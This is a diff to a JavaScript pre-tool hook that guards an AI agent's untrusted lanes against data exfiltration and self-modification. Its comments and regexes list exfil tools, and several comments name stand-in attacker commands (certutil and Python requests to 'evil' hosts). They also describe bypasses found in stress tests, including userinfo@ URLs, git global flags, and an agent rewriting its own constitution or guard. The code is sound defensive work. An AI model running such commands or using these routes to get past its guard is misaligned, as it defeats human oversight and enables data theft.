@@ -45,10 +45,81 @@ const HOST_ALLOW = new Set([
 ]);
 const SSH_ALLOW = new Set(['n8n']); // the ssh config alias for the box
 
-const NET_BINARIES = /\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b/i;
+// A13-T5 (2026-09-10): the list named five binaries while the wrapper's own comment promised to deny
+// "any shell egress". Three more real exfil tools passed untouched: nslookup (DNS exfil needs no URL
+// at all, so the no-URL fail-closed rule below is what catches it), certutil -urlcache (a documented
+// Windows downloader) and bitsadmin /transfer. Interpreters that BUILD a url by concatenation
+// (python -c, node -e) are still NOT covered, and the wrapper comment now says so rather than
+// overpromising: a contract that overstates its coverage is worse than a narrow one, because it
+// stops people looking for the gap.
+const NET_BINARIES = /\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod|nslookup|certutil|bitsadmin)\b/i;
 
+// Every https?:// URL's HOST, parsed by the rules curl itself uses (WHATWG URL): the host is what
+// follows the last '@' of the authority, so `https://allowed.host@evil.example/x` is a request to
+// evil.example. Stress-test A13-T3 (2026-09-09): the old regex stopped at '@' and returned the
+// allowlisted userinfo, a one-character bypass of the whole wall. Any userinfo in the authority is
+// now reported as `userinfo@<real host>`, which can never be on the allowlist, and a URL the parser
+// rejects is reported as '?' (unverifiable = denied, same stance as the no-URL rule below).
 function hostsFromUrls(cmd) {
-  return [...cmd.matchAll(/https?:\/\/([a-z0-9.-]+)/gi)].map(m => m[1].toLowerCase());
+  const out = [];
+  for (const m of cmd.matchAll(/https?:\/\/[^\s"'`<>()|;&]+/gi)) {
+    let u;
+    try { u = new URL(m[0]); } catch { out.push('?'); continue; }
+    const host = u.hostname.toLowerCase().replace(/^\[|\]$/g, '');
+    const authority = m[0].replace(/^https?:\/\//i, '').split(/[/?#]/)[0];
+    if (u.username || u.password || authority.includes('@')) out.push(`userinfo@${host}`);
+    else out.push(host);
+  }
+  return out;
+}
+
+// Bodies are DATA, not destinations (stress-test A13-T6 + M-27, 2026-09-09: the brief's own mark
+// POST carried a github link inside a note's text, and every real block in 42 runs was that false
+// positive, which four organs above the guard then reported as a failed run). The argument of every
+// data-carrying flag and every heredoc body is removed before the scan; the request still goes to
+// its target, which is checked exactly as before.
+// The `i` flag is GONE (A13-T5, 2026-09-10). With it, a lowercase `-f` matched the `-F` alternation
+// and the strip ate the token after it, so `certutil -urlcache -split -f http://evil/x` lost its URL
+// before the scan ever saw it. curl survived only because the no-URL rule below fails closed; a
+// non-curl binary did not. This is the residual of the A13-T6 fix, found by the next audit pass.
+const DATA_ARG = /(?:^|\s)(?:-d|--data(?:-raw|-binary|-urlencode|-ascii)?|--json|-F|--form|--form-string|-[Bb]ody)(?:=|\s+)(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|\S+)/g;
+const HEREDOC = /<<-?\s*['"]?(\w+)['"]?[^\n]*\n[\s\S]*?\n[ \t]*\1\b/g;
+// `keepHeredoc` lets the caller decide what a heredoc body means for the question being asked. The
+// default strips it (bodies are data), which is what the git-verb scan wants; the network scan keeps
+// it when the command is not a network call, because there the body may be a script about to run.
+function stripDataArgs(cmd, opts) {
+  const keepHeredoc = Boolean(opts && opts.keepHeredoc);
+  const withoutHeredoc = keepHeredoc ? cmd : cmd.replace(HEREDOC, ' ');
+  return withoutHeredoc.replace(DATA_ARG, ' ');
+}
+
+// git / gh remote verbs, found by TOKENISING each shell segment instead of a `git\s+push` regex
+// (stress-test A13-T4, 2026-09-09: `git -C x push`, `git --no-pager push` and `gh --repo r api`
+// all slipped past the regex). Global flags before the verb are skipped, and the flags that take a
+// separate value skip that value too; the first bare word after the binary is the verb.
+const GIT_REMOTE = new Set(['push', 'pull', 'fetch', 'clone', 'remote', 'submodule']);
+const GH_VERBS = new Set(['api', 'repo', 'pr', 'issue', 'run', 'secret', 'release', 'gist', 'workflow']);
+const GIT_VALUE_FLAGS = new Set(['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--exec-path', '--super-prefix', '--config-env']);
+const GH_VALUE_FLAGS = new Set(['-R', '--repo', '--hostname']);
+function firstVerb(tokens, i, valueFlags) {
+  for (let j = i + 1; j < tokens.length; j++) {
+    const t = tokens[j];
+    if (t.startsWith('-')) { if (valueFlags.has(t)) j++; continue; }
+    return t.toLowerCase();
+  }
+  return null;
+}
+function remoteVerbs(cmd) {
+  const hits = [];
+  for (const seg of cmd.split(/&&|\|\||;|\||\n/)) {
+    const toks = seg.trim().split(/\s+/).filter(Boolean);
+    toks.forEach((t, i) => {
+      const base = t.replace(/^.*[\\/]/, '').toLowerCase().replace(/\.exe$/, '');
+      if (base === 'git') { const v = firstVerb(toks, i, GIT_VALUE_FLAGS); if (v && GIT_REMOTE.has(v)) hits.push(`git ${v}`); }
+      if (base === 'gh') { const v = firstVerb(toks, i, GH_VALUE_FLAGS); if (v && GH_VERBS.has(v)) hits.push(`gh ${v}`); }
+    });
+  }
+  return hits;
 }
 
 // scp/ssh/rsync/sftp target extraction: `user@host:path`, `host:path`, or a bare `ssh host cmd`.
@@ -70,30 +141,90 @@ function sshTargets(cmd) {
   return out;
 }
 
+/*
+ * IDENTITY SURFACES (A01-T-01 / A13-T-02, 2026-09-11). A lane running
+ * --dangerously-skip-permissions ignores every `allow` and `ask` rule; only `deny` binds. The
+ * settings file carries soul.md and CLAUDE.md as `ask`, which means an untrusted lane could
+ * rewrite the constitution that governs it, or the guard that watches it, and the next session
+ * would load the result as its own identity. The egress guard was the only deterministic thing
+ * standing in these lanes and it never SAW a Write or an Edit, because the hook matcher listed
+ * four tool names and none of them were file writers.
+ *
+ * These paths are refused for WRITING in an untrusted lane, full stop. A lane that needs to edit
+ * its own spec is a lane a human is watching.
+ */
+const IDENTITY_WRITE_DENY = [
+  /(^|[\\/])soul(-core)?\.md(\.staging)?$/i,   // the corpus and the nightly-built injection card
+  /(^|[\\/])CLAUDE\.md$/i,                     // root and every work/NN project constitution
+  /(^|[\\/])\.claude[\\/]/i,                   // settings, hooks, commands, skills
+  /(^|[\\/])\.gitignore$/i,                    // the sole barrier between the vault and a public repo
+  /(^|[\\/])scripts[\\/](untrusted-lane-guard|capture-typed-input)\.js$/i, // the guards themselves
+  /(^|[\\/])system[\\/](manifest|soul-pins)\.json$/i,
+];
+
+/*
+ * MCP VERBS. Deny by what the call DOES to the outside world, not by server name, because the
+ * server list changes and the verbs do not. The split is deliberate:
+ *   - OUTBOUND and DESTRUCTIVE are denied: send, reply, forward, share, submit, respond, trash,
+ *     delete, spawn. A hijacked lane must not be able to speak as Shaheen or destroy evidence.
+ *   - create and update stay ALLOWED, because staging is the triage lane's entire job
+ *     (gmail_create_draft) and a draft is reviewed by a human before it goes anywhere. Denying
+ *     them would close the hole by removing the function.
+ */
+const MCP_VERB_DENY = /(^|_|-)(send|reply|forward|share|submit|respond|trash|delete|remove|spawn)(_|-|$)/i;
+
 // Returns null (allow) or { reason, detail } (deny). Pure - no I/O, no exit.
 function evaluate(hook) {
   const tool = (hook && hook.tool_name) || '';
+  const input = (hook && hook.tool_input) || {};
   if (tool === 'WebFetch' || tool === 'WebSearch') {
     return { reason: `${tool} is disabled in this lane (exfil-by-URL surface, never needed here)`,
-             detail: JSON.stringify((hook && hook.tool_input) || {}).slice(0, 150) };
+             detail: JSON.stringify(input).slice(0, 150) };
   }
+
+  if (/^(Write|Edit|MultiEdit|NotebookEdit)$/.test(tool)) {
+    const p = String(input.file_path || input.notebook_path || '');
+    if (IDENTITY_WRITE_DENY.some((re) => re.test(p))) {
+      return { reason: `${tool} to an identity surface is not allowed in an untrusted lane`, detail: p };
+    }
+    return null; // vault pages, status files and outputs/ are these lanes' real work
+  }
+
+  if (tool.startsWith('mcp__')) {
+    if (MCP_VERB_DENY.test(tool)) {
+      return { reason: `'${tool}' is an outbound or destructive MCP call and is not allowed in an untrusted lane`,
+               detail: JSON.stringify(input).slice(0, 150) };
+    }
+    return null;
+  }
+
   if (tool !== 'Bash' && tool !== 'PowerShell') return null;
 
   const c = String(((hook && hook.tool_input) || {}).command || '');
-  if (/\bgh\s+(api|repo|pr|issue|run|secret|release|gist|workflow)\b/i.test(c)) {
-    return { reason: 'gh (GitHub CLI) is not allowed in an untrusted lane', detail: c };
-  }
-  if (/\bgit\s+(push|pull|fetch|clone|remote|submodule)\b/i.test(c)) {
+  // TWO scans, because a heredoc body is a different thing to each question (A13-T5, 2026-09-10).
+  //   verbScan  - heredocs always stripped. A `git push` written inside a heredoc is TEXT being
+  //               written to a file, not a command being run, and denying it is a false positive
+  //               (pinned by a regression case since the guard was built).
+  //   netScan   - heredocs stripped ONLY for a network binary, where the body really is the request
+  //               payload. Everywhere else the body may be a SCRIPT that is about to execute, and
+  //               stripping it hid `python - <<EOF ... requests.post("https://evil") ... EOF`
+  //               entirely.
+  // One scan could not serve both: making it text lost real egress, keeping it live cried wolf.
+  const verbScan = stripDataArgs(c);
+  const netScan = stripDataArgs(c, { keepHeredoc: !NET_BINARIES.test(c.split(String.fromCharCode(10))[0]) });
+  for (const verb of remoteVerbs(verbScan)) {
+    if (verb.startsWith('gh ')) return { reason: 'gh (GitHub CLI) is not allowed in an untrusted lane', detail: c };
     return { reason: 'git remote operations are not allowed in an untrusted lane', detail: c };
   }
-  const urlHosts = hostsFromUrls(c);
+  const scan = netScan;
+  const urlHosts = hostsFromUrls(scan);
   for (const h of urlHosts) {
     if (!HOST_ALLOW.has(h)) return { reason: `URL host '${h}' is not on the lane allowlist`, detail: c };
   }
-  if (NET_BINARIES.test(c) && urlHosts.length === 0) {
+  if (NET_BINARIES.test(scan) && urlHosts.length === 0) {
     return { reason: 'network binary with no parseable target URL (unverifiable = denied)', detail: c };
   }
-  for (const h of sshTargets(c)) {
+  for (const h of sshTargets(scan)) {
     if (!SSH_ALLOW.has(h) && !HOST_ALLOW.has(h)) {
       return { reason: `ssh/scp target '${h}' is not on the lane allowlist`, detail: c };
     }
@@ -109,7 +240,25 @@ function main() {
   catch { process.exit(0); } // fail-OPEN on a malformed payload: a broken guard must not kill the lane
 
   const verdict = evaluate(hook);
-  if (!verdict) process.exit(0);
+  if (!verdict) {
+    // A13-T11 (2026-09-10): the guard's ONLY artifact was a DENY row, so a guard that had stopped
+    // running and a lane with nothing to block wrote exactly the same thing: nothing. There was no
+    // way to tell a working wall from a dead one. One heartbeat row per lane per DAY (not per call,
+    // which would be thousands) gives C29 something to age, and the whole thing is wrapped so a
+    // heartbeat failure can never turn an allow into a crash.
+    try {
+      const repo = process.env.CLAUDE_PROJECT_DIR || path.join(__dirname, '..');
+      const hb = path.join(repo, 'outputs', 'logs', 'untrusted-lane-heartbeat.jsonl');
+      const today = new Date().toISOString().slice(0, 10);
+      const lane = String(process.env.ALEX_UNTRUSTED_LANE);
+      const last = fs.existsSync(hb) ? fs.readFileSync(hb, 'utf8').trimEnd().split(String.fromCharCode(10)).pop() : '';
+      if (!last.includes(`"${today}"`) || !last.includes(`"${lane}"`)) {
+        fs.mkdirSync(path.dirname(hb), { recursive: true });
+        fs.appendFileSync(hb, JSON.stringify({ day: today, lane, verdict: 'allow' }) + String.fromCharCode(10));
+      }
+    } catch { /* a heartbeat must never turn an allow into a failure */ }
+    process.exit(0);
+  }
 
   try {
     const repo = process.env.CLAUDE_PROJECT_DIR || path.join(__dirname, '..');
@@ -131,5 +280,5 @@ function main() {
   process.exit(2);
 }
 
-module.exports = { evaluate, hostsFromUrls, sshTargets, HOST_ALLOW, SSH_ALLOW };
+module.exports = { evaluate, hostsFromUrls, sshTargets, stripDataArgs, remoteVerbs, HOST_ALLOW, SSH_ALLOW };
 if (require.main === module) main();
